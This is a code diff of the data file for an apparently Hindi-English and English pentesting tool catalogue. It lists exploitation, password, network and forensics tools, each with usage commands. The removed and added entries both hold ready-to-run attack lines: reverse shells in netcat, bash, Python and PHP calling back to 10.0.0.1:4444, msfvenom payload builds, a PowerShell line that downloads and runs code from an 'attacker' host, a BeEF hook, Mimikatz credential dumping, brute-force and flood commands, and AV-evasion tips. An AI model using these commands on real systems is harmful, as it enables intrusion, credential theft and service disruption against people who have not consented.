-            { name: "Metasploit", cat: "Exploitation Framework", desc: "Best exploitation framework. Termux me install ho sakta hai (lekin heavy hai). Lite version use karein.", use: "msfconsole\nsearch type:exploit\nuse exploit/multi/handler\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST 10.0.0.1 LPORT 4444\nexploit", install: "pkg install unstable-repo\npkg install metasploit", tags: ["free","best"] },
-            { name: "MSFvenom (Basic)", cat: "Payload Generator", desc: "Reverse shell payloads generate karne ke liye.", use: "msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o evil.apk\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf", install: "Metasploit ke saath aata hai", tags: ["free","best"] },
-            { name: "Netcat (NC)", cat: "Reverse Shell Listener", desc: "Simple reverse shell listener. Sabse basic aur powerful tool.", use: "Listener: nc -lvnp 4444\nVictim Linux: nc -e /bin/bash 10.0.0.1 4444\nVictim Windows: nc.exe -e cmd.exe 10.0.0.1 4444", install: "pkg install netcat-openbsd", tags: ["free","best"] },
-            { name: "Python Reverse Shell", cat: "Reverse Shell", desc: "Python one-liner reverse shell. Reliable aur widely used.", use: 'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', install: "Python pre-installed", tags: ["free","best"] },
-            { name: "Bash Reverse Shell", cat: "Reverse Shell", desc: "Simple bash reverse shell one-liner.", use: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', install: "Built-in", tags: ["free"] },
-            { name: "PHP Reverse Shell", cat: "Reverse Shell", desc: "PHP reverse shell for web servers.", use: '<?php $s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");?>', install: "PHP ke saath", tags: ["free"] },
-            { name: "Searchsploit", cat: "Exploit Database", desc: "Offline exploit-db search. Specific software ke exploits find karein.", use: "searchsploit apache 2.4.49\nsearchsploit -m 50539", install: "pkg install exploitdb", tags: ["free","best"] },
-            { name: "Ngrok", cat: "Tunnel/Expose", desc: "Local server ko public URL pe expose karta hai. Reverse shell receive karne ke liye useful.", use: "ngrok tcp 4444\nThen use public URL instead of LHOST", install: "pkg install ngrok", tags: ["free","best"] }
-        ]
-    },
-    password: {
-        title: "Password Cracking Tools",
-        subtitle: "Hash cracking, brute force, wordlist generation - Termux optimized",
-        tools: [
-            { name: "John the Ripper", cat: "Password Cracker", desc: "Password cracker - Unix, Windows, LDAP hashes crack karta hai.", use: "john --wordlist=/data/data/com.termux/files/usr/share/wordlists/rockyou.txt hash.txt\njohn --show hash.txt", install: "pkg install john", tags: ["free","best"] },
-            { name: "Hashcat (Termux)", cat: "GPU Password Cracker", desc: "Note: Hashcat Termux me limited hai (GPU nahi hai). Sirf CPU mode me slow chalega. John use karein better hai.", use: "hashcat -m 0 -a 0 hash.txt /sdcard/wordlist.txt", install: "pkg install hashcat", tags: ["free"] },
-            { name: "Hydra", cat: "Online Brute Force", desc: "Online brute-force tool - SSH, FTP, HTTP, MySQL, RDP, VNC sab ke liye.", use: "hydra -l admin -P passwords.txt ssh://target.com\nhydra -L users.txt -P pass.txt ftp://target.com\nhydra -l admin -P pass.txt http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'", install: "pkg install hydra", tags: ["free","best"] },
-            { name: "Medusa", cat: "Parallel Brute Forcer", desc: "Parallel online brute-forcer. Hydra jaisa hi hai.", use: "medusa -h target.com -u admin -P passwords.txt -M ssh", install: "pkg install medusa", tags: ["free"] },
-            { name: "CeWL", cat: "Wordlist Generator", desc: "Target website se custom wordlist generate karta hai.", use: "cewl http://target.com -w custom-wordlist.txt\ncewl http://target.com -d 3 -m 6 -w wordlist.txt", install: "pkg install cewl", tags: ["free"] },
-            { name: "Crunch", cat: "Wordlist Generator", desc: "Pattern-based wordlist generator.", use: "crunch 8 10 0123456789 -o 8digit.txt\ncrunch 6 6 abc123! -o words.txt", install: "pkg install crunch", tags: ["free"] },
-            { name: "Ncrack", cat: "Network Auth Cracker", desc: "High-speed network authentication cracker.", use: "ncrack -u admin -P passwords.txt ssh://target.com:22", install: "pkg install ncrack", tags: ["free"] },
-            { name: "Patator", cat: "Multi-Protocol Brute Forcer", desc: "Flexible brute-forcer with modular design.", use: "patator ssh_login host=target.com user=admin password=FILE0 0=passwords.txt -x ignore:fgrep='authentication failed'", install: "pip install patator", tags: ["free"] }
-        ]
-    },
-    network: {
-        title: "Network & Wireless Tools",
-        subtitle: "Packet analysis, network scanning, MITM - Termux compatible",
-        tools: [
-            { name: "Nmap (Network)", cat: "Network Scanner", desc: "Network discovery, port scanning, OS detection sab ke liye ek hi tool.", use: "nmap -sn 192.168.1.0/24\nnmap -sT -sV -O 192.168.1.1-50\nnmap -p- --min-rate=5000 192.168.1.1", install: "pkg install nmap", tags: ["free","best"] },
-            { name: "Netstat", cat: "Network Connections", desc: "Active network connections, listening ports, routing table dekhein.", use: "netstat -tulpn\nss -tulpn", install: "pkg install net-tools", tags: ["free"] },
-            { name: "Tcpdump", cat: "Packet Capture", desc: "CLI packet capture tool. Network traffic analyze karein.", use: "tcpdump -i any -w capture.pcap\ntcpdump -r capture.pcap 'port 80'", install: "pkg install tcpdump", tags: ["free","best"] },
-            { name: "Bettercap", cat: "MITM Framework", desc: "MITM attacks ke liye best tool. ARP spoofing, DNS spoofing, credential sniffing.", use: "bettercap -iface wlan0\nset arp.spoof.targets 10.0.0.5\narp.spoof on\nnet.sniff on", install: "pkg install bettercap", tags: ["free","best"] },
-            { name: "Ettercap", cat: "MITM Tool", desc: "Classic MITM tool for ARP poisoning and password sniffing.", use: "ettercap -T -M arp /10.0.0.5// /10.0.0.1//", install: "pkg install ettercap", tags: ["free"] },
-            { name: "Masscan", cat: "High-Speed Scanner", desc: "Fast scanner. Pure IP range ko seconds me scan kar sakta hai.", use: "masscan -p22,80,443 192.168.0.0/16 --rate=10000", install: "pkg install masscan", tags: ["free"] },
-            { name: "Hping3", cat: "Packet Crafting", desc: "Custom packets bhejne ke liye. Firewall testing, DoS, port scanning.", use: "hping3 -S target.com -p 80 -c 1\nhping3 target.com --udp --rand-source --flood", install: "pkg install hping3", tags: ["free"] },
-            { name: "TraceRoute", cat: "Network Path", desc: "Target tak network path trace karein - routers aur hops dekhein.", use: "traceroute target.com\nmtr target.com", install: "pkg install traceroute", tags: ["free"] },
-            { name: "WiFi Info", cat: "WiFi Scanner", desc: "Aas-paas ke WiFi networks ki jankari - SSID, BSSID, signal strength, channel.", use: "termux-wifi-scaninfo\nnmcli dev wifi list", install: "pkg install termux-api\npkg install networkmanager", tags: ["free"] }
-        ]
-    },
-    forensic: {
-        title: "Forensics & Analysis Tools",
-        subtitle: "File analysis, metadata extraction, steganography - Termux compatible",
-        tools: [
-            { name: "Binwalk", cat: "Firmware Analysis", desc: "Firmware images scan karta hai aur embedded filesystems extract karta hai.", use: "binwalk firmware.bin\nbinwalk -Me firmware.bin", install: "pkg install binwalk", tags: ["free"] },
-            { name: "ExifTool", cat: "Metadata Analysis", desc: "Photos, documents, videos se metadata read karein - GPS, camera info, dates.", use: "exiftool image.jpg\nexiftool -gps:all -c '%.6f' image.jpg", install: "pkg install exiftool", tags: ["free"] },
-            { name: "Foremost", cat: "File Carving", desc: "Deleted files recover karein disk images se.", use: "foremost -i disk.img -o recovered/", install: "pkg install foremost", tags: ["free"] },
-            { name: "Steghide", cat: "Steganography", desc: "Images aur audio files me data hide/extract karein.", use: "steghide extract -sf image.jpg -p password\nsteghide embed -cf cover.jpg -ef secret.txt -p password", install: "pkg install steghide", tags: ["free"] },
-            { name: "Strings", cat: "String Extraction", desc: "Binary files se readable strings extract karein - passwords, URLs, usernames.", use: "strings suspicious_file.exe | grep -i password\nstrings memory.dump | grep -i 'http\\|https'", install: "pkg install binutils", tags: ["free","best"] },
-            { name: "Hexdump", cat: "Hex Viewer", desc: "File ko hex format me dekhein. File signatures analyze karein.", use: "xxd file.bin | head -50\nhexdump -C file.bin | head", install: "pkg install xxd", tags: ["free"] },
-            { name: "File Command", cat: "File Type Detection", desc: "File ka actual type batata hai (extension se nahi, content se).", use: "file suspicious_file\nfile disk.img", install: "pkg install file", tags: ["free"] },
-            { name: "Hash Check", cat: "Hash Verification", desc: "File ka MD5/SHA1/SHA256 hash nikalta hai. Integrity check ke liye.", use: "md5sum file.bin\nsha256sum file.bin\nhash -a md5 file.bin", install: "pkg install coreutils", tags: ["free"] }
-        ]
-    }
+    recon: { title: "Reconnaissance & OSINT Tools", subtitle: "Information gathering, subdomain discovery, email enumeration", tools: [
+        { name: "Nmap", cat: "Network Scanner", desc: "The industry standard network discovery and port scanning tool.", use: "nmap -sV -sC -O -A target.com", tags: ["free","best"] },
+        { name: "Shodan", cat: "Device Search Engine", desc: "Search engine for internet-connected devices. Find exposed cameras, servers, ICS/SCADA.", use: "Search: port:22 country:IN", tags: ["free"] },
+        { name: "Amass", cat: "Subdomain Enumeration", desc: "Advanced subdomain discovery tool by OWASP.", use: "amass enum -d target.com", tags: ["free","best"] },
+        { name: "theHarvester", cat: "Email & Domain OSINT", desc: "Gather emails, subdomains, IPs from public sources.", use: "theHarvester -d target.com -b google,linkedin,bing", tags: ["free"] },
+        { name: "Sublist3r", cat: "Subdomain Discovery", desc: "Fast subdomain enumeration using search engines.", use: "sublist3r -d target.com", tags: ["free"] },
+        { name: "WhatWeb", cat: "Website Fingerprinting", desc: "Identify CMS, frameworks, libraries, and server software.", use: "whatweb target.com", tags: ["free"] },
+        { name: "DNSRecon", cat: "DNS Enumeration", desc: "Advanced DNS enumeration tool for SRV records, zone transfers.", use: "dnsrecon -d target.com -t std", tags: ["free"] },
+        { name: "Whois", cat: "Domain Intelligence", desc: "Query domain registration details.", use: "whois target.com", tags: ["free"] },
+        { name: "Google Dorking", cat: "Search Engine OSINT", desc: "Advanced Google search operators for sensitive data.", use: 'site:target.com filetype:pdf\ninurl:admin', tags: ["free","best"] },
+        { name: "Recon-ng", cat: "OSINT Framework", desc: "Full-featured reconnaissance framework with modules.", use: "recon-ng\nmarketplace install all\nworkspace create target", tags: ["free"] },
+        { name: "SpiderFoot", cat: "Automated OSINT", desc: "Automated OSINT across 200+ data sources.", use: "spiderfoot -s target.com -o report.html", tags: ["free"] },
+        { name: "PhoneInfoga", cat: "Phone OSINT", desc: "Advanced phone number OSINT tool.", use: "phoneinfoga scan -n +919876543210", tags: ["free"] },
+        { name: "Wayback URLs", cat: "Historical URLs", desc: "Fetch historical URLs from Wayback Machine.", use: "gau target.com | grep '.php'", tags: ["free"] },
+        { name: "WafW00f", cat: "WAF Detection", desc: "Detect Web Application Firewalls.", use: "wafw00f target.com", tags: ["free"] },
+        { name: "Subfinder", cat: "Subdomain Discovery", desc: "Fast subdomain enumeration.", use: "subfinder -d target.com", tags: ["free","best"] }
+    ]},
+    web: { title: "Web Application Security Tools", subtitle: "Web scanning, SQL injection, XSS, API testing, directory busting", tools: [
+        { name: "Burp Suite", cat: "Web Proxy", desc: "The #1 web application security testing platform.", use: "Set browser proxy to 127.0.0.1:8080", tags: ["paid","best"] },
+        { name: "OWASP ZAP", cat: "Web Scanner", desc: "Free open-source web app scanner.", use: "zap.sh -daemon -port 8080\nzap-cli quick-scan target.com", tags: ["free","best"] },
+        { name: "sqlmap", cat: "SQL Injection", desc: "Automated SQL injection tool for all databases.", use: "sqlmap -u 'http://target.com/page?id=1' --dbs\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables", tags: ["free","best"] },
+        { name: "Nikto", cat: "Web Server Scanner", desc: "Scans for 6700+ dangerous files.", use: "nikto -h target.com -ssl", tags: ["free"] },
+        { name: "Gobuster", cat: "Directory Busting", desc: "Discover hidden directories and files.", use: "gobuster dir -u http://target.com -w wordlist.txt", tags: ["free","best"] },
+        { name: "Dirsearch", cat: "Directory Scanner", desc: "Advanced directory brute-forcing.", use: "dirsearch -u target.com -e php,html,txt", tags: ["free"] },
+        { name: "WPScan", cat: "WordPress Scanner", desc: "WordPress vulnerability scanner.", use: "wpscan --url target.com --enumerate p,t,u", tags: ["free","best"] },
+        { name: "FFUF", cat: "Fast Fuzzer", desc: "Fast web fuzzer for directories, parameters, vhosts.", use: "ffuf -u http://target.com/FUZZ -w wordlist.txt", tags: ["free","best"] },
+        { name: "XSStrike", cat: "XSS Scanner", desc: "Advanced XSS scanner with WAF bypass.", use: "xsstrike -u 'http://target.com/search?q=test'", tags: ["free"] },
+        { name: "WFuzz", cat: "Web Fuzzer", desc: "Web fuzzer for parameters and content injection.", use: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", tags: ["free"] },
+        { name: "Joomscan", cat: "Joomla Scanner", desc: "Vulnerability scanner for Joomla CMS.", use: "joomscan -u target.com", tags: ["free"] },
+        { name: "Droopescan", cat: "CMS Scanner", desc: "Scanner for Drupal, Joomla, WordPress.", use: "droopescan scan drupal -u target.com", tags: ["free"] },
+        { name: "Retire.js", cat: "JS Library Scanner", desc: "Scan for outdated JS libraries.", use: "retire --outputformat txt --outputpath report.txt", tags: ["free"] },
+        { name: "CORS Scanner", cat: "CORS Tester", desc: "Test for misconfigured CORS policies.", use: "curl -H 'Origin: https://evil.com' -I http://target.com/api", tags: ["free"] },
+        { name: "Acunetix", cat: "Enterprise Scanner", desc: "Enterprise-grade web vulnerability scanner.", use: "Configure target and run full scan", tags: ["paid"] },
+        { name: "Postman", cat: "API Testing", desc: "API development and testing platform.", use: "Import collection and send requests", tags: ["free"] }
+    ]},
+    exploit: { title: "Exploitation Frameworks & Payloads", subtitle: "Metasploit, reverse shells, payload generation, C2", tools: [
+        { name: "Metasploit", cat: "Exploitation Framework", desc: "2000+ exploits, payloads, encoders.", use: "msfconsole\nsearch type:exploit\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nexploit", tags: ["free","best"] },
+        { name: "MSFvenom", cat: "Payload Generator", desc: "Generate payloads in multiple formats.", use: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe", tags: ["free","best"] },
+        { name: "Netcat", cat: "Reverse Shell", desc: "Simple reverse shell listener.", use: "Listener: nc -lvnp 4444\nVictim: nc -e /bin/bash 10.0.0.1 4444", tags: ["free","best"] },
+        { name: "Python Reverse Shell", cat: "Reverse Shell", desc: "Python one-liner reverse shell.", use: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", tags: ["free","best"] },
+        { name: "Bash Reverse Shell", cat: "Reverse Shell", desc: "Simple bash reverse shell.", use: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", tags: ["free"] },
+        { name: "PHP Reverse Shell", cat: "Reverse Shell", desc: "PHP reverse shell for web servers.", use: "<?php $s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");?>", tags: ["free"] },
+        { name: "Searchsploit", cat: "Exploit Database", desc: "Offline exploit database search.", use: "searchsploit apache 2.4.49\nsearchsploit -m 50539", tags: ["free","best"] },
+        { name: "BeEF", cat: "Browser Exploitation", desc: "Browser Exploitation Framework.", use: "beef-xss\nHook: <script src='http://your-ip:3000/hook.js'>", tags: ["free","best"] },
+        { name: "Empire", cat: "Post-Exploitation", desc: "PowerShell post-exploitation framework.", use: "powershell-empire server\n./starkiller", tags: ["free"] },
+        { name: "Veil Evasion", cat: "AV Evasion", desc: "Generate AV-evading payloads.", use: "veil\nuse evasion\nlist\nuse python/shellcode_inject/base64.py", tags: ["free"] },
+        { name: "Nishang", cat: "PowerShell Exploitation", desc: "PowerShell exploitation framework.", use: "powershell -exec bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')", tags: ["free"] },
+        { name: "Ngrok", cat: "Tunnel", desc: "Expose local server to public URL.", use: "ngrok tcp 4444\nThen use public URL as LHOST", tags: ["free","best"] }
+    ]},
+    password: { title: "Password Cracking & Authentication Tools", subtitle: "Hash cracking, brute force, wordlist generation, credential theft", tools: [
+        { name: "Hashcat", cat: "GPU Cracker", desc: "Fastest GPU-based password recovery. 300+ hash types.", use: "hashcat -m 1000 -a 0 hash.txt rockyou.txt", tags: ["free","best"] },
+        { name: "John the Ripper", cat: "Password Cracker", desc: "Classic password cracker.", use: "john --wordlist=rockyou.txt hash.txt\njohn --show hash.txt", tags: ["free","best"] },
+        { name: "Hydra", cat: "Online Brute Force", desc: "Fast online brute-forcer for 50+ protocols.", use: "hydra -l admin -P passwords.txt ssh://target.com\nhydra -L users.txt -P pass.txt ftp://target.com", tags: ["free","best"] },
+        { name: "Medusa", cat: "Parallel Brute Forcer", desc: "Highly parallel online brute-forcer.", use: "medusa -h target.com -u admin -P passwords.txt -M ssh", tags: ["free"] },
+        { name: "CeWL", cat: "Wordlist Generator", desc: "Generate wordlists by spidering websites.", use: "cewl http://target.com -w custom-wordlist.txt", tags: ["free"] },
+        { name: "Crunch", cat: "Wordlist Generator", desc: "Generate custom password wordlists.", use: "crunch 8 10 0123456789 -o 8digit.txt", tags: ["free"] },
+        { name: "Mimikatz", cat: "Credential Theft", desc: "Extract passwords from Windows memory.", use: "mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords", tags: ["free","best"] },
+        { name: "Responder", cat: "NTLM Hash Capture", desc: "Capture NTLM hashes on Windows networks.", use: "responder -I eth0 -dwP", tags: ["free","best"] },
+        { name: "Impacket", cat: "Credential Dumper", desc: "Extract Windows credentials remotely.", use: "secretsdump.py domain/user:Pass@target.com", tags: ["free","best"] },
+        { name: "ophcrack", cat: "LM/NTLM Cracker", desc: "Crack Windows hashes with rainbow tables.", use: "ophcrack -d /path/to/tables -t hash.txt", tags: ["free"] },
+        { name: "Patator", cat: "Brute Forcer", desc: "Flexible multi-protocol brute-forcer.", use: "patator ssh_login host=target.com user=admin password=FILE0 0=passwords.txt", tags: ["free"] },
+        { name: "Ncrack", cat: "Auth Cracker", desc: "High-speed network authentication cracker.", use: "ncrack -u admin -P passwords.txt ssh://target.com:22", tags: ["free"] },
+        { name: "LAPSToolkit", cat: "LAPS Analysis", desc: "Analyze LAPS passwords from AD.", use: "Get-LAPSComputers\nGet-StoredLocalPassword -ComputerName PC01", tags: ["free"] }
+    ]},
+    network: { title: "Network & Wireless Tools", subtitle: "Packet analysis, Wi-Fi hacking, MITM, network scanning", tools: [
+        { name: "Wireshark", cat: "Packet Analyzer", desc: "World's most popular network protocol analyzer.", use: "Capture traffic and analyze with filters", tags: ["free","best"] },
+        { name: "tcpdump", cat: "CLI Packet Capture", desc: "Command-line packet capture tool.", use: "tcpdump -i eth0 -w capture.pcap\ntcpdump -r capture.pcap 'port 80'", tags: ["free","best"] },
+        { name: "Aircrack-ng", cat: "Wi-Fi Security", desc: "Complete Wi-Fi security suite.", use: "airmon-ng start wlan0\nairodump-ng wlan0mon\naircrack-ng -w wordlist.txt handshake.cap", tags: ["free","best"] },
+        { name: "Bettercap", cat: "MITM Framework", desc: "Advanced MITM framework.", use: "bettercap -iface eth0\nset arp.spoof.targets 10.0.0.5\narp.spoof on\nnet.sniff on", tags: ["free","best"] },
+        { name: "Ettercap", cat: "MITM Tool", desc: "Classic MITM for ARP poisoning.", use: "ettercap -T -M arp /10.0.0.5// /10.0.0.1//", tags: ["free"] },
+        { name: "Masscan", cat: "High-Speed Scanner", desc: "Fastest scanner for large networks.", use: "masscan -p22,80,443 192.168.0.0/16 --rate=10000", tags: ["free"] },
+        { name: "Zmap", cat: "Internet Scanner", desc: "Scan entire IPv4 space in minutes.", use: "zmap -p 443 0.0.0.0/0", tags: ["free"] },
+        { name: "Hping3", cat: "Packet Crafting", desc: "Custom packet crafting tool.", use: "hping3 -S target.com -p 80 -c 1", tags: ["free"] },
+        { name: "OpenVAS", cat: "Vulnerability Scanner", desc: "50,000+ vulnerability tests.", use: "gvm-start\nOpen https://localhost:9392", tags: ["free","best"] },
+        { name: "Snort", cat: "IDS/IPS", desc: "Network intrusion detection system.", use: "snort -i eth0 -c /etc/snort/snort.conf -A console", tags: ["free"] },
+        { name: "Kismet", cat: "Wireless Sniffer", desc: "Wireless network detector and sniffer.", use: "kismet\nWeb: http://localhost:2501", tags: ["free"] },
+        { name: "Reaver", cat: "WPS Attack", desc: "Brute-force WPS PINs.", use: "wash -i wlan0mon\nreaver -i wlan0mon -b MAC -K 1", tags: ["free"] }
+    ]},
+    forensic: { title: "Forensics & Analysis Tools", subtitle: "Disk forensics, memory analysis, steganography, metadata extraction", tools: [
+        { name: "Autopsy", cat: "Disk Forensics", desc: "GUI digital forensics platform.", use: "autopsy\nCreate case and add data source", tags: ["free","best"] },
+        { name: "Volatility", cat: "Memory Forensics", desc: "Advanced memory analysis framework.", use: "volatility -f memory.dump imageinfo\nvolatility -f memory.dump pslist\nvolatility -f memory.dump netscan", tags: ["free","best"] },
+        { name: "Foremost", cat: "File Carving", desc: "Recover deleted files from disk.", use: "foremost -i disk.dd -o output/", tags: ["free"] },
+        { name: "Binwalk", cat: "Firmware Analysis", desc: "Firmware analysis and extraction.", use: "binwalk firmware.bin\nbinwalk -Me firmware.bin", tags: ["free"] },
+        { name: "ExifTool", cat: "Metadata Analysis", desc: "Read metadata from files.", use: "exiftool image.jpg\nexiftool -gps:all image.jpg", tags: ["free"] },
+        { name: "Steghide", cat: "Steganography", desc: "Hide/extract data in images/audio.", use: "steghide extract -sf image.jpg -p password", tags: ["free"] },
+        { name: "YARA", cat: "Malware Detection", desc: "Pattern-matching for malware.", use: "yara -s rule.yara suspicious.exe", tags: ["free","best"] },
+        { name: "Strings", cat: "String Extraction", desc: "Extract strings from binary files.", use: "strings file.exe | grep -i password", tags: ["free","best"] },
+        { name: "ClamAV", cat: "Antivirus", desc: "Open-source antivirus engine.", use: "clamscan -r /home/user/", tags: ["free"] },
+        { name: "RegRipper", cat: "Registry Analysis", desc: "Windows registry forensics.", use: "rip.pl -r SYSTEM -f system", tags: ["free"] },
+        { name: "PDFiD", cat: "PDF Analysis", desc: "Analyze PDF for malicious content.", use: "pdfid.py suspicious.pdf", tags: ["free"] }
+    ]}
 };
 
 const tipsData = [
-    { num: 1, title: "Methodology First, Tools Second", desc: "Pehle structured methodology follow karein (PTES, OWASP). Tools sirf enabler hain." },
-    { num: 2, title: "Termux Storage Setup", desc: "termux-setup-storage se sdcard access karein. Files /sdcard/ me save karein." },
-    { num: 3, title: "Use VPN for Anonymity", desc: "Termux me Termux:OpenVPN install karein. Anonymous testing ke liye zaroori hai." },
-    { num: 4, title: "Document Everything", desc: "Termux me 'script' command se session log karein. Output ko files me save karein." },
-    { num: 5, title: "Master the CLI", desc: "GUI nahi chalega phone me. Command line master karna hoga. Yeh hi advantage hai." },
-    { num: 6, title: "Recon is 60% of the Work", desc: "60% time recon me lagayein. Target ke baare me jitna zyada pata hoga, utna aasan hoga." },
-    { num: 7, title: "Always Verify Authorization", desc: "Sirf apne systems ya written permission wale systems test karein. Legal rahein." },
-    { num: 8, title: "Tmux Use Karein", desc: "pkg install tmux - Multiple shells ek saath chalayein. Sessions save hote hain." },
-    { num: 9, title: "Keep Termux Updated", desc: "pkg update && pkg upgrade regularly karein. Naye tools aur bug fixes aate hain." },
-    { num: 10, title: "Wordlists kaam mein laayein", desc: "pkg install wordlist se rockyou.txt download karein. /data/data/com.termux/files/usr/share/wordlists/ me milega." },
-    { num: 11, title: "Python Scripts Likhein", desc: "Python Termux me best language hai. Custom tools aur scripts bana sakte hain." },
-    { num: 12, title: "Learn Network Basics", desc: "TCP/IP, DNS, HTTP, SSL/TLS samjhein. Protocol samajhna attack surface samajhna hai." },
-    { num: 13, title: "Ngrok Use Karein", desc: "Ngrok se local server ko public URL pe expose karein. Reverse shells receive karne ke liye best." },
-    { num: 14, title: "Stay Current with CVEs", desc: "Twitter par infosec accounts follow karein. Reddit r/netsec padhein. Naye exploits ke baare me janein." },
-    { num: 15, title: "Practice on HackTheBox", desc: "HTB, TryHackMe, VulnHub - yahan safe environment me practice kar sakte hain." },
-    { num: 16, title: "Custom Wordlists Banayein", desc: "CeWL se target-specific wordlists banayein. Specific passwords specific targets ke liye effective." },
-    { num: 17, title: "Network Pivoting Seekhein", desc: "Chisel aur SSH tunneling seekhein. Ek machine se doosri machine me jump karna aata hona chahiye." },
-    { num: 18, title: "OPSEC Zaroori Hai", desc: "VPN, proxy, Tor use karein. Red teaming me early caught mat ho." },
-    { num: 19, title: "Shell Types Samjhein", desc: "Reverse shell vs bind shell. Encrypted shell vs plaintext. Meterpreter vs netcat." },
-    { num: 20, title: "Daily 30 Minutes Padhein", desc: "Roz 30 minute cybersecurity padhein. Consistency se expertise aati hai, intensity se nahi." },
-    { num: 21, title: "Google Dorking Master Karein", desc: "site:, filetype:, inurl:, intitle: operators seekhein. Sensitive data find karna aasan ho jayega." },
-    { num: 22, title: "GitHub Dorking Bhi Seekhein", desc: "GitHub par credentials, API keys, internal docs exposed hote hain. Dorking se find karein." },
-    { num: 23, title: "Write Professional Reports", desc: "Pentest ki value report me hai. Clear findings, PoC, impact, remediation likhein." },
-    { num: 24, title: "BeEF Framework Use Karein", desc: "Browser Exploitation Framework. XSS ke through browser control karein." },
-    { num: 25, title: "Logs Check Karein", desc: "/var/log/ me logs check karein. Attack ke baad cleanup ke liye zaroori." },
-    { num: 26, title: "Understand Pivoting", desc: "Ek compromised machine se internal network me move karna seekhein." },
-    { num: 27, title: "Least Privilege Principle", desc: "Hamesha least privilege user se start karein. Root/sudo turant use na karein." },
-    { num: 28, title: "Backup Command History", desc: "cat ~/.bash_history > backup.txt. Baad me analysis ke liye useful." },
-    { num: 29, title: "Know When to Stop", desc: "Objective achieve ho gaya? Stop karein. Extra testing risk hai." },
-    { num: 30, title: "Stay Ethical", desc: "Izzat sabse badi hai. Ethical hackers ki reputation hi unki sabse badi asset hai." }
+    { num: 1, title: "Methodology First, Tools Second", desc: "Follow structured pentest methodology (PTES, OWASP). Tools are enablers, not the main thing." },
+    { num: 2, title: "Always Start with Recon", desc: "60% of your time should be on recon. More intel = easier exploitation." },
+    { num: 3, title: "Document Everything", desc: "Note every command, output, and finding. Use CherryTree, KeepNote, or Obsidian." },
+    { num: 4, title: "Master the CLI", desc: "CLI tools are faster, scriptable, and work over SSH. Automate with bash/python." },
+    { num: 5, title: "Learn Network Protocols Deeply", desc: "TCP/IP, DNS, HTTP, SSL/TLS. Understanding protocol = understanding attack surface." },
+    { num: 6, title: "Always Verify Authorization", desc: "Get written permission. Define scope, rules, and emergency contacts." },
+    { num: 7, title: "Keep a Home Lab", desc: "Set up VMs for Windows, Linux, AD. Practice safely before production." },
+    { num: 8, title: "Chain Vulnerabilities", desc: "Combine low-severity issues into critical exploits. Stored XSS + CSRF = Account Takeover." },
+    { num: 9, title: "Read Exploit-DB Thoroughly", desc: "Understand vulnerability before running exploit. Customize for your target." },
+    { num: 10, title: "Customize Wordlists", desc: "Use CeWL for target-specific wordlists. Combine with common lists for best results." },
+    { num: 11, title: "Use Tmux or Screen", desc: "Manage multiple shells. Detach and reattach without losing context." },
+    { num: 12, title: "Learn Python", desc: "Python is king in cybersecurity. Automate scanning, write exploits, analyze data." },
+    { num: 13, title: "Focus on Evasion", desc: "Bypass AV, AMSI, EDR, firewalls. Detection knowledge = exploitation skill." },
+    { num: 14, title: "Build a Cheat Sheet", desc: "Keep a growing cheat sheet. Your future self will thank you." },
+    { num: 15, title: "Stay Current with CVEs", desc: "Follow CVE feeds, infosec Twitter, Reddit r/netsec." },
+    { num: 16, title: "Practice CTFs", desc: "HackTheBox, TryHackMe, VulnHub for safe practice." },
+    { num: 17, title: "Write Professional Reports", desc: "Clear findings with PoC, impact, and remediation." },
+    { num: 18, title: "Learn Active Directory", desc: "80% of enterprises use AD. BloodHound, Kerberoasting, DCSync." },
+    { num: 19, title: "Use Password Managers", desc: "Bitwarden or KeePassXC. Never reuse passwords." },
+    { num: 20, title: "Network Pivoting is Essential", desc: "Chisel, Ligolo-ng, SSH tunneling for lateral movement." },
+    { num: 21, title: "OPSEC Matters", desc: "Use VPNs, proxy chains. Getting caught early fails objective." },
+    { num: 22, title: "Master Google Dorking", desc: "site:, filetype:, inurl: operators for finding exposed data." },
+    { num: 23, title: "GitHub Dorking", desc: "Find credentials, API keys, internal docs on GitHub." },
+    { num: 24, title: "Know When to Stop", desc: "Found domain admin? Stop and report. Don't test beyond objective." },
+    { num: 25, title: "Stay Humble and Ethical", desc: "Reputation is everything in infosec. Professionalism matters." },
+    { num: 26, title: "Learn C2 Frameworks", desc: "Sliver, Covenant, Mythic. Understand profiles and OPSEC." },
+    { num: 27, title: "Daily Learning", desc: "30 minutes daily. Consistency beats intensity." },
+    { num: 28, title: "Read Tool Source Code", desc: "Understanding internals of Metasploit, BloodHound makes you better." },
+    { num: 29, title: "Contribute to Community", desc: "Publish writeups, contribute to open-source." },
+    { num: 30, title: "Shell Types", desc: "Reverse vs bind shell. Meterpreter vs netcat. Encrypted vs plaintext." }
 ];
 
 const container = document.getElementById('toolPagesContainer');
@@ -476,101 +485,37 @@ categories.forEach(catId => {
             if(t==='best') return '<span class="tool-tag best">&#9733; Best</span>';
             return '';
         }).join('');
-        toolsHTML += `
-            <div class="tool-card">
-                <h3>${tool.name}</h3>
-                <span class="tool-cat">${tool.cat}</span>
-                <p>${tool.desc}</p>
-                <div class="tool-use">$ ${tool.use.replace(/\n/g, '<br>$ ')}</div>
